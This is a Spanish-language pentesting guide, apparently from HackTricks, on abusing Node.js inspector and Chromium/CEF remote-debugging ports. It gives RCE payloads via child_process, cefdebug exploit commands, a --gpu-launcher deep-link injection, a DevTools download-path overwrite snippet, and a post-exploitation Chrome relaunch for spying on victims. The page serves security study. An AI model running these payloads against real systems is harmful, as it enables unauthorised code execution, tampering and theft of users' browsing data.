# Abuso del inspector de Node/depuración de CEF

{{#include ../../banners/hacktricks-training.md}}

## Información básica

[Según la documentación](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Cuando se inicia con el switch `--inspect`, un proceso de Node.js escucha a un cliente de depuración. De forma **predeterminada**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.

Los clientes del inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Dado que el **debugger tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso capaz de conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).

Hay varias formas de iniciar un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando inicias un proceso inspeccionado, aparecerá algo como esto:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) necesitan usar el parámetro `--remote-debugging-port=9222` para abrir el **debugger** (las protecciones contra SSRF siguen siendo muy similares). Sin embargo, en lugar de conceder una sesión de **debug** de **NodeJS**, se comunicarán con el navegador mediante el [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), una interfaz para controlar el navegador, pero no existe un RCE directo.

Cuando inicias un navegador en modo debug, aparecerá algo parecido a esto:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets y same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden realizar solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Es necesaria una **conexión HTTP inicial** para **obtener un identificador único de sesión del debugger**. La **same-origin-policy** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Como medida de seguridad adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **encabezados 'Host'** de la conexión especifiquen exactamente una **dirección IP**, **`localhost`** o **`localhost6`**.

> [!TIP]
> Estas **medidas de seguridad impiden explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que podría hacerse explotando una vuln de SSRF).

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso de nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener suficientes privilegios, por lo que esto podría concederte **acceso privilegiado a la información dentro del proceso**, pero no una escalada directa de privilegios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Esto resulta útil en containers porque **detener el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **container** será **terminado** junto con el proceso.

### Conectarse al inspector/debugger

Para conectarse a un navegador basado en **Chromium**, se puede acceder a las URLs `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, se debe comprobar que el **host y el puerto de destino** estén correctamente incluidos. La imagen muestra un ejemplo de Remote Code Execution (RCE):

![Después de una URL para acceder al debugger aparecerá. Por ejemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/debugger: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Usando la **línea de comandos**, puedes conectarte a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** ejecutándose localmente e **inyectar código** en ellos.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Ten en cuenta que los **exploits de RCE de NodeJS no funcionarán** si estás conectado a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debes revisar la API para encontrar cosas interesantes que hacer con él).

## RCE en NodeJS Debugger/Inspector

> [!TIP]
> Si has llegado aquí buscando cómo obtener [**RCE a partir de un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node consisten en usar algo como lo siguiente (parece que esto **no funcionará en una conexión al Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
En esta sección solo enumeraré cosas interesantes que he encontrado que otras personas han utilizado para explotar este protocolo.

### Parameter Injection via Deep Links

En el [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security descubrió que una aplicación basada en CEF **registraba una UR**I personalizada en el sistema (workspaces://index.html) que recibía la URI completa y luego **iniciaba la aplicació**n basada en CEF con una configuración que se construía parcialmente a partir de esa URI.

Se descubrió que los parámetros de la URI se decodificaban mediante URL decoding y se utilizaban para iniciar la aplicación básica de CEF, lo que permitía a un usuario **inyectar** el flag **`--gpu-launcher`** en la **línea de comandos** y ejecutar cualquier cosa.

Por lo tanto, un payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará un calc.exe.

### Sobrescribir archivos

Cambia la carpeta donde se van a guardar los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** utilizado frecuentemente por la aplicación con tu **código malicioso**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE y exfiltration

According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) es posible obtener RCE y hacer exfiltration de páginas internas de theriver.

### Post-Exploitation

En un entorno real y **después de comprometer** un PC de usuario que utilice un navegador basado en Chrome/Chromium, podrías iniciar un proceso de Chrome con el **debugging activado y hacer port-forward del puerto de debugging** para poder acceder a él. De esta forma, podrás **inspeccionar todo lo que la víctima haga con Chrome y robar información sensible**.

La forma sigilosa consiste en **terminar todos los procesos de Chrome** y, a continuación, ejecutar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencias

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
